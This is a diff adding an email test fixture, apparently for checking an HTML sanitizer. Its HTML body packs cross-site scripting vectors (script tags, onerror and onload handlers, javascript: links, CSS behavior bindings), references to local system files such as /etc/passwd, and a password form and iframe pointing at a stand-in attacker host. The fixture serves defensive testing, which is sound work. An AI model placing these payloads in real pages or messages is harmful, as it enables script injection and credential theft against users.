@@ -1,0 +1,15 @@
+From: Fixture Sender <news@example.com>
+To: Test Reader <reader@hcgmail.test>
+Subject: Hostile content
+Date: Thu, 12 Nov 2026 09:30:00 +0100
+Message-ID: <1156784170@example.com>
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><head><script>alert(1)</script><base href="file:///etc/"><meta http-equiv="refresh" content="0;url=https://evil.example.com"></head>
+<body onload="steal()"><p>Visible safe text.</p>
+<img src="x" onerror="alert(2)" alt="broken"><img src="file:///C:/Windows/win.ini" alt="local file">
+<a href="javascript:alert(3)">js link</a> <a href="https://example.com/ok">ok link</a> <a href="file:///etc/passwd">file link</a>
+<form action="https://evil.example.com/login"><input name="password" type="password"><button>Sign in</button></form>
+<iframe src="https://evil.example.com/frame"></iframe><object data="x.swf"></object><svg onload="alert(4)"><text>svg</text></svg>
+<div style="background:url(javascript:alert(5));behavior:url(x.htc);-moz-binding:url(x.xml)">styled</div></body></html>
